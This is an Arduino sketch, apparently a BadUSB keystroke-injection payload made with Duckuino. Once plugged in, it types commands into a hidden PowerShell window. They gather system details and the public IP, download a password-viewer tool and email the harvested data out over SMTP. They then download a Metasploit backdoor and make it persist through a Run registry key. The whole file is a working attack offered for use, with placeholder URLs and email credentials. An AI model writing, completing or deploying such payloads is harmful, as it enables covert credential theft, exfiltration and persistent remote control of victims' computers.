/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(60000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press("r");
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("powershell -windowstyle hidden"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("$info=systeminfo | findstr /c:\"Registered Owner\" /c:\"System Type\" /c:\"Host Name\" /c:\"Domain\" /c:\"OS Name\""));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("$info+=nslookup myip.opendns.com. resolver1.opendns.com | findstr \"Address\""));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("$str= Out-String -InputObject $info"));

  delay(100);
  Keyboard.print(F("$SMTPServer = 'smtp-mail.outlook.com'"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$SMTPInfo.EnableSsl = $true"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("IEX (New-Object Net.WebClient).DownloadFile('url for the passviewer','passviewer.exe')"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$passlist= passviewer.exe"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$secpasswd = ConvertTo-SecureString \"your password\" -AsPlainText -Force"));

  delay(100);
  typeKey(KEY_RETURN);

  Keyboard.print(F("$mycreds = New-Object System.Management.Automation.PSCredential (\"your email\", $secpasswd)"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("Send-MailMessage -From \"your email\" -To \"reciever's email\" -Subject \"report for password\" -Body  $str + $pass -Priority High -SmtpServer \"smtp-mail.outlook.com\" -Port \"587\" -UseSsl -Credential $mycreds"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("IEX (New-Object Net.WebClient).DownloadFile('url for the metasploit backdoor','C:\\Program Files\\backd00r.exe')"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"aloo\" /t REG_SZ /F /D \"C:\\Program Files\\backd00r.exe\""));

  delay(100);
  Keyboard.print(F("del pwd.txt"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
